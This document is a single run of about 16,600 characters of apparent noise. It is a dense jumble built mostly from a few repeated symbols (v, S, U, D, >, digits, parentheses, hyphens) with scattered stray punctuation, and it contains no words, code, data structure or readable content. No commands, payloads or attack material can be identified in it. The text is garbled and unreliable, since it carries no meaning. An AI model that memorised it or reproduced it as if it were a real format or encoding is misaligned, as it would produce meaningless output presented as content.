-(84/II>D>t(vv(U4_I--1v>(UVSDtU c-(4ryD>>8cSvv{.10tcc18(rUI8tvS 8cr4Ivt>SU8S9vI >YUD81((IU>I-vv>(uI4DU->v4(S4SD U(v4 4 IDtU1cv SrsD4U1c> 4rS1>t S( 4r41>DUSD8vVUI3>vS1c-iUrS>U- vSu44 >>>vvS(>rcD7Uvv1-c4UD-Uvc  mr .>UDcU Svr1 t(c484--1Ut1Svcv<%14t1U>-IBSI>> -S84 UI>14( vv(U4^!t-1vD(UrtDvUSt4(r41D>48cS cr 45I8c18?rU1>tvUM8p(4((t>S48S0>I D S4S jDIU>1-vtI(%Ir>1tDvU(>8 D8U_v4--4>DtUScU-Cr(D4U1t4 Ur-1vtU-  4r11>> SS8cm I t4-nUUwtIS>v-1v9hrI1>>4ZvS(v4 D(-4v1(>4UDSUvc  .rSD1U>cU SrD1 tGc4S4SS8-XtI->(SI14>(S>8U_Svv:cI(>>-UI>DU-Svv(  ( 8rpDt8U 1(crvDI84 4 trD1tUtSc1*tDc1 >rU(trt14tcS(vVD>>>>c--vcLc4(81((IU>S-v>t-cc (8IrDSU14vDSU_v4(1S((t4r1U  rSD4U1c>SDSc8 rU1ttcr111tUSS8vS((-D8S18>kU4U (- v9:44 >>-UvS(v>DD!-4v1(D4UDUUvcUrt44D1U>S1 Src1 tLc48/vU1ttSSvvSh51rt1-1DceSIv> -c84Z1I>>U8rvv( 4Q>r-1v1(UlSrtU c!(441D>UrcSvv8-10U4c1 >rU1ttvSU_tr411t>SU8SNcI >ES4vCcUIt>S-vv (fIr>1U11c(S4vD UUv4(14>IU1Dcv  rVD4U1c4 U(11ct S5 46D1>ttSS8c/ Iv41SI8>+U4c>v-8v0(  >>D-UvS(v4 D(-4c4t-4UDSUvcv b44D1tiU( -rc1 t&c4 Ir>1ttSSv4>%J14t1S>8UoSIv> -18461I>>>-Svc( 4vr1-Iv>(U4SDvU8co(4cvD>UUcS cr 1TU4c1 DrU1Stvt 8%r411t>-88SuvI 41IItrSDvvrS4&>8Utv8(4-I,D--vIt 1--8cI >DUUIcv  ryHerU1ttDSt88rrS86D:UX(-UStt4>-(kt4--8>?UIS4DI-Dvc(vv(84v>>USv-(4-4c8(>4UDS1t1/U(cX U4rD1 SrS1 t0c4Udv>1Ut>Sv8 ^kvcrII8>1nSII> -_84cv8rBt4 DU->  ir44v> S4SDvU tSU-c>(414DrtSSc8vI(1vt8Sv >tvSS8gr411l(1t>8StI >SS481?>(D( II>--4c >1U-vU(S4vuc4cD>U(vI 1>StSt(S88(r(1I UrI1vt SVtcS(84rr1D> -UIR> S18>gU >Ht4>DvE448>>-UvSS>v-(8r DDU1(DDtUvc  z44D1U>cUSSrv1Dt2c4 1-(8-fU1r>c-l rrr1r8UMrIv> -*UDSIv((SIrDUU-vv(8-1vr(U4SDv1rDrU c( SUDcS vr 1TU4c18>8U1t(U(U(1rIv>4L((-v_vI->KS481->8t;r4SDc(88S>4(>7- 8oDU48rv4  4>DUUSD8U(8I(rrc1U UrU1vt SHUIv81I>D4vII>(t->r(Ur>gUI>>v- vKcD8I(84SvS v4 DL-4UIUrc1 c>vtUU(S% t>>t>tcS-8crcI( 1P81UtSSv-cSU r%41DtD->8t(v-.v B1I>>U1t>IU1vcD(-1v>(U4SDvI Ivc44rU1rI 4a8U-%r(rt> >rD1StvS -t-(ZIt>-(8S}vI rr1IU(-U8I(8II>-U8I4D(->vU(S8U(DrvD>U(4>1UUScv  8U88rtDDtSSc IrSD tISD844U1->S-SI(t4S1v(AUIS>v1 >1Srcckr4>Dt(v4cD:-4v1UUvI IUvcU }44D11It4tUcc rrcS(1Sc8>4IcUr(S> U1t1- 8UBSIvr IrD(-cv4((4cD (c>>r-DS>>rc> >%v(c8(441D>UUcS v4 rrU4S  >rU1SI-I(t4Sv8cW(SDrI11>(Drtt p>1(S>t84UDv>84Ut8S8vccvcD U*v4 4U(DUUScv8trMD4U1S1v rS1ct SD 4r11>DU-88vK8IWtrS1v1sUrS>-- v(W4II>>t(vS8v4rDd-rv1(D4UItUv-  >44DIU>ct SNV1 DaSr 1rD1Ut-Sv8-N7141vS>8t7SIS> -X84Y1rc>U-Svv( 4ZDu-1v4SS4-DvU >4(44ID>>USS vr-1Ct c1v1rUIUc4S 8-r44^t>SU8S^v4D>Y-881((IU>U-vvUr-I4D(->cU(S4cD U(v4 C8UDtUScv8 rMDrU1c4-Sr-1vt D4 4rI1>DU-S8vO-IF> S1vv/U4US4- v-g44c>>-UvS(vrDDjU8v1 (4UDUUvcUJ-441(U>S4 Src1 t(c48/vU1ttSSvvU_p1rt1S4USV-Iv> 1484;II>1UDDvv(-4BD -1c8(UJS8-U cc(4r(D>>vcSvvrt1;t8c1 rrU4>tvU 8Ur4I(t>SI8S(8I D -r81(9IU>I-vv (Or7>4->vr(SPID Ugv4812-DUUIcv tr04SU1S1 DrS11t -D 4r11>>> 18vwDIJ>&S18>:U4U>S- v>!44x>>-UvS S4vD!Utv18 4UDSUvSv8>441UU>S4 Srv1 > SI 13-1U1SSv8 3C4M> S>vSkS08> -584(44->UUcvv8r4)>4-1c14 4S1vU ->(441D>t> O vu815D>c1 >rUIUvDS v r44It>SU8S(S4t>yU(81  IU>S-vv  UI4D8->cD(S4vD U)SS(1rTDUUScv 8rO4vt c> IrS  t S( 4rr1>t1Dv8cQ I9r1S18D,UrS4t- vS<44X>>tIvS8v58D(Uvv1 i4UIcUvSv8(4418U>SU Srv1 DB-U 1g(1UtISvc>kZ4M>(S>vm3S4t> -284(4rS>U-rvv -4d>4-1c1(14SD4U S((441D>UUS  vrt1OtUc1 1rU11S(S 8Sr4lvt>St8S7DI >vD18I/>IUI4-vv8(u4 r>-DvU(Sv D U(v481 rDUU1cv Sr248U1->-IrS1>t SS 4 -1>>>-88vftIR>tS18>KUrSDU- v-.448>>trvS8v4-DgUcv1 (4UD-Uv- 8c4418U>cr S( 1 D;S4 1<(1UtISvc-Re44DpS>8rKSID> tD84A18U>t-1vv(U4yDc-1S>cI4SD>U cS(4rrD>>4c8 vrU1MI8c1 DrU4StvSS-4rr11t>>I8S2cI >vD18I&>IU_v-vv8(Mr_ t->v4(S41D Ubv4(18(DtU1cv 8rnDrU1S1 rrS1>t S- 4r11>DU-D8vOtIF> S1crsUrS>D- v-C448>>>(vS(v41D%USv1(>4UDSUvc 8t4418U>cr Sr11 tYS- 1_H1UtUSv88<!4XIcS>84zS4 > -m84&148>U-1vv(84PDm-1S>(14SD>U cS(4(>D>>Uct vrU1Btvc1v-rU11>1S 8Sr4 +t>St8SicI >vD18I!>IUr>-vv8(/4 r>-DvU(Sv D U(v4 4S-DUU1cv81r9D4U1->SIrS1>t SS 4Et1>D4S-8viUI%r-S18D{UIt>v-SU4srI1>>I(vS(c4 Dv11vI(>4U(vUvc8 fB4Y(U>c4 SrU1 ttc4v18r1Ut1Sv8Ub,Ivt1t%8tCSI>> 1484%II>14-SvUS=4(>4-1>U(U4-DvUSt4(r41D>1IcS cr 1S>jc1 >rUIdtvS88TL611t4DS8-*vI >>S48Io>IUE4-vv ({Ir>1->vU(S4vD Ugv4 I4>DUUScv >r!D4U1t1t-c>8IIc11t-S11>t1SS8v{ (4rrIttrPUI4>v- vQc-v>(I41>-U vc(cU(v1(>4UDSUvc  344D1U4cU Srv >#c1ct(r>I(tSSv8 v88SrII1ttStvUM-4 84(AI>>U-SD(-8cv(S-1c (U4SDvIUDcU>cD(Ir(1>tIr IJU4c1 >vm8Di(18t4SI8cr4D>>c-8vSru1r>4-4IUDv-vv (_ v(c4U>1c1vI vr81 crc  (r DU  r8D4U1c>tScD8Dt SU 4r11>4c1->1vU8r(}1rtroU4(>v- vFc>vD*IItD Svv4((r-D(U14UD>Uvc  TSc(Ir811 Sr>1 tnc4-1cD8>rDI >SBJI>t1S>8UvUv8!S4ttv-(vS(-It>IUSct>4U8v>(U4S0>4-D8t cD 1DDU  vr 1C>iIt >rU1S> S 8mr411S8SU8SavI8>C-N81(<Dr>S-vv (cI4>I->vt(S4U{;U(v4(14rDUU-cv S84DrU1c>c8rS1ct ShU1r11>tUSS8vL Iit48c8>mUIS>c- v ^44 t(-UvS(v41Dg-rv1(D4UD>I c8 E441SU>ct SrU(Rt(c4 1r>1Ut-Sv8 c414t1S>8thSIv> tpU891I>>U-Svv(r4Q141(v>(U4SDvU cS(4N1rrUUcS vr 17t-c1v>WU1StcS 8Hr4ISt>->xT0vIc>_Sr815>IU>SUIv ((I4>r->v>(S4>ttUjvr(14>DUU-cv 8r_1 I>cD UrS1vt S( 404v-tUS-8v}cI_t4S1c>>hIS>c- v(C44->>U>ct(v4vDAU4v1(>4UDStrc  (44D4U>c> S vI4t5cr 1r11Ut-Svv #(14tIS>v-ASIv> U vcY1I1>UU-vv( 4o14-4v>(>4SDSU cD(4r41-UUct vrt1}U4c1v>xr1St-S 88r4I(t>->81?vIS>+-c81)>IU1SDtv (vI4DZ->vI(SrS rU2c8(1r(DUUScvv 8cD4t(c> IrS1tt S<v-r111tUSD8vWvIx>4I48>CtISDF- v ,444D--UvU(vr8D7-4v18>rDDSUSc   441-U>S> Irv1ct,S  1r>1U>UU(8 !v14>sS>8UkS4S>v-<v8p1I4>U-Svv( r >4-4v>(I4SDSU S< D41DDUUc4 vrv12t >> DrU1StvS 8(r411& SU8SuvI8>OS481}>IU>S-vv (UI4>1->vU(U4vD U2>IS84>1(UScv  8(88%)1tvU81 clv1I 4g 1>tUSS---(84OvIc>(<UII>v- vP-cv((4Ir>DU cUDpU8v1(>4U S4-D8U1c>D1U4cU Srv8tr(1->7r>I(tSSv8 c881rIIctI S ()8I484(>I>>U-St---v1(8IrD48U88 8rH18t c( 1trcS vr I ZDc1 >rU11tvS 8nr4tct>SU8SNcI > S4v r(IU>S-vv-(eIr>1-DvU(>8 D8U&v4 (4>DtUScU-br(D4U1-x Ur-1v>vII 4r11>t1SS8vs I{S-S18>iUI->v-vvB 4 (>>-UvS(v4 D8-4S1cr4UDSUvc  =r!D1tM8r Srv1 t1c4 Ir>1ttSSUUVf(14t1-S8Uj-Iv>SD48r_1I>>U-Svc( r  D-1v>(U4-DvU cK848(D>UUcS vr 1UU4U  DrU1Stv-88Grr11>(SU8>c I8>fS4vI.>It>S-UtF((I4>1->vU(-4v1vrIv4(14>DIUScv  rS4-UIcD UrS1vt8Sj rr11>c9SS8vk I9t4S18>iU4 >v- vV(RI1>D-Uv>S 48D}-4v1(>4tDSUvD> }44D1UDcU Srv1 t(c4 1r>r-tSSv8 #8-?r4FSr-Ur tv18J84( I>>U-S>8-( IOr4cDU(DDI1ccvSr44c-vDvScS Dr 1/U4D UrcD8>l8IvS8E(&ItvvvrcS1DcII>481(8IU>S-v>(Sr 8(>IrDc-rvt cUpc:(14>DU4ctD c1vctcvcD =-8UwI(S:8 r11>tUD8tcSD84t4-R8>HUISrUI-DUU I1D8-UvS(v >(cIrDUU4c/rU4c1v Cr(D1U>cUtvct8tt8cSS4DDU-Df8( (8r14>8S>8UaS8DK-4v>c-(vU(4-tI> >cSU4rSht>S vDvU-cd(441 >4tDrtSSc1Bt c1 >rU8Irc1D>vr4I t>SU8Sv-84%tI8>>-4IU>1-vv (T (r 41>tU8vtD Uvv4(14>(r4-1(U-r21-U1c> Uvt8 r81Dt8(1(-rtIv8vFvIft4S1U4cUIt>v- vpX4I1r>r1US(v4IDT-4v1S(vI >1-D>Utc> fr1DItvrv1-t+c4 1v48(<>I0t-w(14t1SI8UwSIv4D48-r%rI>>U-Svv( 4W>4D1v> (4SDvU t(t8SV t>Ut1UcSv IU4S> >rU1S4-1-t1S8 r94UUU8-8v+(84 >(-1IU>4-vv (7 4(D4ID(U>vI (44v4  4>DUUSt-t(c4 vrc1( U,v1vt S?-vSc8Ur1>1tI-vv8( >r> -(v eU- vDw4I1>>1vDc--v8(114DU-DS((DrSccrvUtUvUDc^>8DLU(t8t-vSSU4Uzr>v1cD414>cS>8U0SvD((4 >t-rv>otIt>t( 4t>4-1v>Scv-(DrHDtt S((44IcS Ir 1bU4trt ct8Urc1c>vS884tISU8SBvI >RS4 1vtIDv 1v1>t#4(>c(1UU(S4tD U^v4Stct(14D13  &ZD4U1c>-iSD8(r814tISc 44>Ic>8-S ArrI4>4JUII>v- vLc4vUGDr(>DUSccD84I4v>a5UU-4r48c44418U>cU S8t8Rr(1TtUcr 1tSSU8 __144rI8D SD8=> -V84(4-(>U-Svv  4E>4-1c18(4SDcU Sv(441D>>Uc- vr81TUrc1vrrU4S>rS 8(r41It>S>8S v41>lSr81MDIU>1-vS  cI4>I->vt(SrSD >5S-(14DDUU-cv8>rzD4Dvc> trS1St S{ 4r14ctUSS8v) I!>_S184cSI->v- ttX4II>>tUcS(v4-DfU v18c4U1Uv4c  -444SU>cU SrvIDtMS8 1W(1UtUSv8UIt14>(S>t(gSIc> -H84(p U>t-SvvSD4z>r-1S> U4SDtU cv(4!ID>t> A vrt13ttc1 >rU1S>IS 8cr4I8t>S>8S<>>D>i-881S8IU>--vv (L4 r>-DvU(S8ID U(v481 rDUUDcv SrR1tU1->>DrS1tt Sc 4ic1>DUS-8v%-I6>8S1c8aUrSD1- vc644(>>U vS S4vDZUvv18u4UDSUvSv I4418U>SD Srv1 DaS( 1{(1UtISv84#l4jD-S>vl_SIc> -N84(4>{>U-rvv(-4%>4-1c1 84SD4U -t(441D>t>S  vrI1QtDc1 >rUIUt>S 81r4IDt>SU8S(SI->!-D81( IU>S-vcv(>I4D>->vD(S4vD t vr(1rtDU>4cv  r#IjcSc>8UrSr(t S_ 4{4tvtU--8v cI+t4S1v1DrISDS- Sv}4I1>>U>v1(vrcDgUDv1(>4UDSU1c  -441rU>cU SrvIDtnSv 1r>1Ut-SvcU(c14>(S>t(wSIc> Uc84(h U>t-SvvSD4Z>r-1S>cI4SD>U cv(4(-D>>U-- crU1Otvc1ctrUIU>IS 8-r4Ist>SU8S vIS>B-c81((IUD -vcv(II4Dv->Sv(S4vD t c4(1r8DU> cv  rgI}Urc>8 rS41t SK 4r11ItUSI8v)1IP>NS1vjc>I->>- ttY4II>>-rvS(U8,D(-4v1-84UD-Uv- Sc441 U>c1 S(r1 D&D8 1P61Ut1Svc(a:4ZD8S>8r5S4U> -M84 14h>U-Ivv(t4LI>-1S> D4SDDU c-(4W4D>>Uct vrt1Atcc1c(rU4S>1S 8-r4I8t>t88S v4 >k-c81((IU1c-vv S4IrD ->v4(S4DD >dt8(1r}DUU1cvvUrf4vUtc> 4rSESt S( 4(81>t1Dv8c% Ih43S18D7UI>r -8vfW48c>>-tvS ScrD{Uvv1 D4UDSUvc S-4r1 U>ct Src1 > -c 1J.1U>1Sv8 /i44trS>8r6SIU> tD84 14I>U-Ivv(t4f1(-1v>(r4SD1U c_(441D>UUcr vrt1Ptcc18 rU1StIS 8Sr414t>St8S(S(c>(-v81(UIU>S-vv (>I4D ->vt(S4SD >Ecv(1rgDUU1cvv r6I4>mc> 4rS1>t -I 4_ I tUS18vcDIHtrS18>fUI>r -8v!548c>>-tvS ScrDKUvv1 (4UDSUv- Sc441 U>c4 S( 1 DScr 1b:1U4DSv88*748t1S4US3-Iv> 1c84AII>>11vvc( 4CH--1vD(U7SrtU cS(4r}D>t8cSvv8-1;tvc18ErUrvtvUU11r4I t>>>8S}cI D>S4vLcUIt>S-vUv(7Ir>1Uic>(S4vD U>v4(I4>D>UScU-^r(D4U1Sv Ur-1vt 1U 4r11>ttSS8v3 I&t4S18>}UI4>v- vC:4I4>>-UvS-8 tD&Uvv1(>4UrIr81ctcct (U>Sc Srv1 4818tUcr D#>Uv-vSrv(ir1r>D.SIt> -k84-18IOt4 DH( 4S>4-1v>cDcc  4UDtUc411>UUcS v888c_ 1Dv>84 -PS1rcOv;8DKIIDtD--I >vS481#>vrR-IIDS(24c>1->vU-Ivt S4-D8U>SY11UScv  { 8DU1c> UrI1vt Sk 41c1>tUSS8cL I t4- (8PUIS>vUcvp/rI1>>-Uv>S 48DP-4cr(>4tDStS1r ;44D1t cU Srv1 ctc4 1r>1ttSSS8  n(8t1S>8UJSIv>--ac4c(I>>U-Svv( 4S>4U  8(U4SDvU cH(r41D>UUc>- r81&U4c1 >rt1S>SIr8hr411tDSU8S.vr 4cS481i>IU>S--v 8S->>1->vU(S4vD8U}cm(144iSU-cv  r,D4UIc>8>-81vt S#8 r11>tUS1cI98I(t4S18>ntIS>c- vu1SI1>>-UvS(v4 D;-4cU(>4UDSUSc  (441lIUct Srv1 tmcr 1r>8OtSSv8 R(14t1S>8Ub-Iv> -AS4X1I>>U-Sv-( 4y>41cDIct4tdtc84t-4tS>Svrtc -r 1eU4c1 >rU1SIvS 8vr411t>DDtr-48->G-c81n>IUr1It>cUvvI(4>IvD(S4vD Uyv4(1r>rUUSc>  r+D41r1St(cD8 ;SSQ8vr11>tU>t->-v8(iDI(8>(GIS>v- tB-Ivr(841>rU8coD;U4v1(>4Ur-rt1SUr64g 4D1>t8(vJvrrI(trcr8DtS-v8 /X144vIr>cS-v ((It> c4vt(-4>tv-8c   -1vr(U4SDv1rDrU c( SUDcS vr 1LU4c1(>8-1t1c(814rIUr4c>I-Sd- U tS(-D84cvvvD v (vI4>1->t1-Dc1 SU6c8(14>DUrSDcUDS 8(U1Sc UrS1vIt1c> 8r8 H(I tU-v8c/1S184=UIS>vDr>(--v>>>UcvS(v4 b848DU-rvD >>vtvUrS( r4r1D SP 1 t:c4- S88Sr>>>tD- v((W>I>0SrvJ2S-<v B1I>>U4I>c-Dcv>4-4v>(U4SWUI c((44r4-1ScD4v4>U8r4(1 Ir tDDLU veUvUbI>SU81+vI >!1ItDc-8tZr4 v (tI4>1->>--c t i4cDDUcvr DUSc-  rJD4r>Drtrrt8(>Uv(SIS-r88D>v8v!DILt4S1D(--vUNr4cD,Sr8r;r-D 8IID->r(rDDut -DSUrc  y44.UrtDDU-SZ( r1Dr>ccr8>tSSD8 _714z81r>1SI8t(74S84(cI>>U-SU-->v( _II>IU1vD SU cv(441D>4rD-t(c-1stcc1 >rU?D0 18t S>8(r4SU8DXvI >%1 >c-4vvGD-vvU(QI4>1DID-Uvv>(D4-v4 84>DUUS>vU4c(8-r(11tDrS1It SZ 4vv rrtI >US>( rrI48ID8(t-4c((--cU 4U-UvU(v4 DJIIt8(I1c-rctc(1(cI>DvtcU rrv1 t?>DUIS(8SrrIU>-Sv88trvItcI4I8OItt4(1>II>U-Svv( 4Gr4JyU>(U41DvU coSccD IrI1(Utc 15U4c181Ur1StvS v(r411t>->8>*vI8>{t 81e>IU1S--v ((I4>I->S-(SPvD-U&vr(14DDU>(cvv stD4UIc> trS4ut Um88r11DtUS-8vPtI)D4UU8>dtIS>c- c 64I1I -Uv-(v4vD#-4v1(>d8DSUvc  =44D4U>c1-vrc1 txDD 1rD1UDS-v8 xc14>%S>8t/S4SS1-Xvc^14S>U-Svv( rt>4U(v>(r4SDSU cSr-41DrUUD8 vr81eU4c1 4vS1-tvS UIr41It>UUvS/vI->F- 81(rIUDU84v (-I4Ic->vU(S4v1DUuc8(1r(DUUUcv UI-D4t(c>8IrS1ct S( 4y,(UttSS8v(-I.trS184cSI->v- tIY4II>>tUUD(v4-DWU v1v84UISA-c  c441(U>SD S(v14t;S8 1rr1UD1Svc ^S14>(S>8IGS4v> U vc)14o>UUIvv( 4l1GtSv>(r4SD1U c#(4;11rUUcI vrt1G>Dc181Zv1St1S v>r411t>->r1evID>,-181f>IUDU-1v (>I41c->vU(SrSD1Uzct(141DUUScv8vr(D4tUc>8-rS1vt - 81r1I-tUUS8vM IgD}U-8>(SIS1 - vuk444Dc-Ucc(v4rD!-4v1 1D DStvc v444D1U>S>rsrvI8tKU> 1r>1U>U(D8 ( 141SS>8UfS4S>U-!c(91I1>U-Svv( r >4U8v> D4SDvU cK 8411xUUcS vr81BDvSc >rI1Sr(S 8(r4r1t>S1UvxcI >p1D81#DIU1SDtv (SI4D7->c8(SjvI8U(cv(1rdDUU>cv8vdtD4t8c> IrS1vt Uzv>r1I(tUSI8v(rITDBUv8>(yIS>>- v+*444Dv-Uvr(v4UD/-4v1 1r>DSU4c  844D1U>cU8 rv1tt6SU 1r11Ut18(8 uS14I8S>8t0SID> -vU1_II>>U>Ivv(84sD 1>vD(U4S((U c((4&1rrUUc1 vrS1Wttc1v>vI1St>S 8Sr4Ict>->v>MvIt>6t 81a>IU1SUcv (-I4D8->-l(S=vDDUNcc(1r(DU>-cvv rUD4t8c> rrS4-t Uk8>r1I(tUSI8vsII9D4US8>9rIS>D- vtB4I1kU-tv1(v4UDjUcv18> IDSU>c  S444tU>-4 8rv1UtC>  1rD1U1cSv8Sv41rt1S>-1mSIc> -vU1NII>>UI8vv(8431?rtv>(44S1>U c;(4415(Utc1 vr81bUrc181&-1St>S v-r411t>UUvSlvIt>2- 81(cIU1SU1v (-I4D8->cR(S4v1vU*cS(14>DUUScv  O8D4t8c> rrS11t SYv r1IetUSU8v!8IkDj>c8>K4IS1S- vhC4I1>I-Uv1(v48DeUFv18>rDDSU>c  S4448U>-U >rv1Ut*Sv 1nv1Ut1SD8 AS144rS>8t6SIc> -vU13II>>U1tvv(84bD 1>vD(U4S((U c((4r48-UUc1 v(I1FU4c1v>8I1St>S 8Sr44Tt>U48-HvIU>X1S81iDIUIS-vvSc4Ir>1->>V(S4cD Uvt1(I4>DU48cv 8rRI4I(c> 4rS1Ut Ut 4(1,rtUS18vyUIa18S1S^6tIS>>- tI{4II>>t_vS(U8sD(-4v1--4UD-UvcSS44rD1U>t1 Src1 tS-^ 1r>1U>,Sv88p?Iot1S4USz-Iv> ->84_II>>UI4vv( 4R>r-1v>(U4SDvU cB(4:SD>UUcS -r 10U4c1 >rU1StvS 8>r411t>D Utc8 g4vI8tr-t819D-vv1(iI4>14->tU48v(44(1-U(c1 DUS-S  rxD4rv14t1SS8-11UrcIS8 Dnc1D>-8:v zI14>S--v4I Ic>r-DED A>t-c-Dv8(I48Drvt4U1vUvc  Hc1 (} 11-Scc trc>(>(S18DhcIS8 av14t1S>>S-Dv&V4-+vc91I>>U4SD{-8ct(-4>D((D4SDvU c+(441>>1-cS Ur 1pU4I8UDS(8>tvS-8?r411g41ttU-d8->e-S81W>IU(>48DcUvcQ(c4U>r(S4DD Uzv4Svc4 1rStDU-SvD4tvc> UrS8U_(14>8St 1rIIU8S38I(t4-?8>0UIS*DI8>I-8I1I(-UvS(v(( 848D4tCvI Ur-U(-uS8(4rS1(Ut888crrIQ>xvt8>r>1t>v8I&r+r1Ic4- 8I<rItD vt+DIU>Svv(-4_>4-1D>-tvr Srcc8(441D>UUcS vY h?U4S- >rU1SI1IS>vS4(rrrI>>1SI8c*cS4v__>IU>SIU>8Uv8r>1->vU(S4vD >rv4(14>4-rtDttvSS 8r41Ic-vS8trv11t-cr#tPDIc>S-S(r(JI+tr->(84c4c>88vvU(84c>rUU(r4(>4-1vKvD DrS1cUrS{rtU>c> Srv1 rt1  1%g1UtSSvtDS4v(0(I1>1&SIt> -584-18I<t4 D:Uc4C>4-1v>-S4SDcU cT(441D>>4c- vr81mt c1 DrUI1tvSS-4rr11t>S18S*cI >vD18IJ>IUD--vv8(0rF t->vt(SrvD Uiv481(vDtU-cv 8rQI U1->84rS1ct S( 4r41>>>-v8vscI:>4S18>sUrSD:- v8;4Ir>>UvvS Sr DTU8v1(44UDSUvc   441 U>ct Srv1 > Sv 1g(1U>-Sv8 0J14t1S>8IjSIt> --84M14(>U-tvv(-4J>4-1v>(t4SDcU cQ(444D>UUct vr 1bUrc1 >rU1>trS 8Yr44>t>St8S(Svr>,Sr81(>IU>S-vS 8>Ir>I->vt(SrUD >Yc4(14DDUU-cv vr:I_>cc> DrSIvt S} 4(114tUSt8vmcIJ>>S1v1!4IS>t- vv=4I1>>-UvU(v4UD,-rv1(>4U1Ut1c  -44I8U>cU Srvy1t(SS 1r>1UtSSv8 hr14>(S>8I7SI1> -bvDp1II>U-Dvv( 4_>4Uvv>(t4SDvU c (441IcUUcS vr81eU4c1811 1StcS vSr411t>UU-DNvIv>LS481prIU>1cDv ( I41r->vt(S4cD Uvt1(I4>DU>tcv 8rG1 I>cD UrS4rt S( 4(1TrtUSU8vJ I{>8S1Sa;tIS>S- SD04II>>-4vS(U8hD(-4v1vc4UD-Uv- Sc44D4U>cU Srt1 DScr 1r11U1(Sv88&jI1t1S4USW-Iv> tD84hII>1UDDvv(v4w>4-1vr(U4SD-U c (441D>UUcS8SD11#t#c1 DrU1Stv-v>Ir41rt>->8S6vI 13D881?4IU>S-vc-(fI41r-DvD(S4SD Ucv4 28UDtUScvt r^DrU1c>--rS11t S( 4r11>>>>18vjDIR>tS18>2UrS>1- v>=448>>tlvS(v4IDpU-v1(14UDUUvc  -44DIU>S( Srv1 > -- 1X81U>8Sv8 xn44>SS>v GSID> -884=14D>U-rvv(v4*Di-1c1 c4SD4U cI(441D>>UcU vrI1{tcc18(rU1StIS 8>r414t>S>8SO><D>(-U81vUIU>--vvD(64 r>-DvU(S  D U(v4 J8UDtUScvt r}DrU1S1>crS1It -  4r11>tU1v8vm1Id>.S18>ZUIS1--8vtK4I4>>U8vS(U8}D(-4v1-S4UD-Uv-UD144D4U>tI Src1 t(c48uvU1ttSSv--uE1rt1S4USe-Iv> DI84/II>D>r8vv n4QDt-1v>(U4SU4U cr(4rtD>UUcS vcc1(t1c1 1rU1UtvSUrIr41It>D88SOcI >4S4vWcUIt>S-vUI(xIr>1-4tS(-4vD IDv4(I4>DUIccv >r0D4U1c> Ur>( t8SK 4c-1>ttSSvS-rI6>1S1v-wUIS>v- DD&44D>>-DvS(v4 DbU8v1 U4UDUUvcv {WC1>U>S- SG(1 tbc4 1(v1U>SSv8r<214t1S>v-ES48> - 84y4I>>4-4vv :4pmv-1vD(UrcDvUSt4(r41D>I4cS cr 1vI1cI >rU (tvS88X(Tvtt>-S8S(4I >fS4v 88ItDc-vv ()Ir>1-1vU(St1D UYv4(44>DUUScvI>r,D4U1cI UrS1vt 18 r6>1>t>SS8S3 rpcIS181jUIU>v->vJ(v44>>U(vScS4 D(-4v4(>41pvUcc  E8mD1UDcUv1t!1 tUc4t1r>1ttS-88 Hv(1tIS>8U-SIv>8-YcmUtI>D(-Sv4( 40>4t1>r(U4rDvUDcR8-41D>U>cS 4r 1 U4c1 >rU4 tvSI87rr11t>SU8S (I >tS4v-2>It>SUSc1(m4->1U8vU(S4vD U(v4 c4>DtUScc  L 1tU1S8 U(:1vt S,8v c1D> SS8cL I(t4Sr8>lUU4>v- vy(0I1>>-UvS114 D;-4vI(>4UDSUv-I (44D1UDcU Srv1 4>cr8cr>1>tSSc8 ( 4ct1-88U=rIv> -pc0ISI>D -Sc-( 4_>4-1cS(U4rDvUvc.(r4116t>cS -r roU4cI >r>1StUD58(r4111>SU8-9vI 3US481^>It>S-vv (i4V>1->vU(>4vD U_v4 r4>DUUS> t(Sv((4I1-UIvt tRvISt8S48I1SIy>--(84t4-(8>:UIS(UI8> ->v(>>-4vS(v4 (t41Dr-rc> >Uvct p44D144DIt c> Dr1188-r>1UtS-S>rT.14t1S48U?SIvDv8>84:II>>t-Svv( 4!D>-1v>(U4UDvU8ca(4A4DDUUcS vr 17U4c1 IrU1StvS 8^r411>14c8S=vI > S481L>rU4D-vv (EI4>1-IvU(Sv D U(v4(14>DUUScvU_r{1pU1cD UrS1vt cj 4r11>t>SS8cM I0ESS18>KUI->v- v%O4I1>>-UvS(r4 Dd-4v1(44UDSUvDtU(cD (U>S( Srv1 x-I{tcS4 Ir11It4Sc14>SS>8UQS(Da-4vt(-(v1(4Ir>---4=D -1v>(UcI(c4D1v(4rrD>UUcS- S(8v4(DIt-cI(trtIv>SS884_ItS>C--v(K4S4v-)>IU>S1JD(-88r(U1>Dv--cI(-r v4 S4>DUUSt4-c8r01I(1UUDSc Ur-SBvcr11>tUD>ttS48c54ID>1-1 >(81 >1Sr8rhr1(DvU-cS((41>r-r4U1(Uvc  *8S8Rr41U-tct8vNS1-Urcr1U>cSv8 h*  d(IStI-Sv8(v4vt(-(v1(4Ir>---4zDc-1v>(U8S L481tU8c4 I>CcS vr I 8>c1 >rU1UtvS 8i(_ISt>St8S:tI >WS4v4  IU>U-vv8(iI4>1t>S((S4SD U v4(r4>1>>(cv SrR1-U1c> UrSDIt S  4ME1>t>SScv(IIQ>,S181VUII>v- t4m446>>-UvS(v4 Dz8Dv1(14UD>Uvc  ;4484U>cU Srv1 t(c484>>1UtSSv8S^x14t1S>v(wSIv> -(84aII>D>UIvv( 4N>r-1v>(U*S1-U c_(441D>UDcS8SrS1ktyc18vrU1StvS  tr411t>S>8S;SI 1)-I81J>IU>S-vv>(?I4f>->v>(S4cD U{v4(1DrDUUtcv vrpD4U1S18trS1Ut S( 4r11>DUSU8v,SI/> S1vcgUrSDc- vvj44T>>-4vS(vrrD*-4v1(44UD-Uvc  t44D1U>ct Srv1 tdc4 1r>1Ut-Sv8 O914>(S>8UeSvvecI(>>-UI4>U-Svv vcI>4-1v>(t4SDvU c cS41DDUUcS vr 1FU4SU >rU1StSS 8(r411M SU8SmvI8>=S481&>It>S-vv 8SI4>1->vU(-4vD Uec-(r4>DUUScv  SNcc11c>8vrS1vt D-UrSc84I4Ic>Svc8UO-IUt4LUI1>v- voc(  (1ItD8-t4c4vrDcvr>S2t> S() ^4rD1U>cU8sr-4SD8(41DtDcS8S  8 (X14t1S>U)-Dv(E8I4>I-c84r>4cD8US8a}r44D4(D4SDvU c,(441>>1-cS >r 1uU4I(tUSU -r-1I88O>Iv> >tIU4UUrcr-(vU( 4^4-(S S1I(I>1-rvU(S4vr-rSD8U>c4DUt-cv  rM(Gr(1>tvcr -r8Ivt8S&(I91Ic>SS88-K8Srt(S8U-S8U4*UD4(1>>U(vS(v4 r84S>IU1vt(trUD-t r( 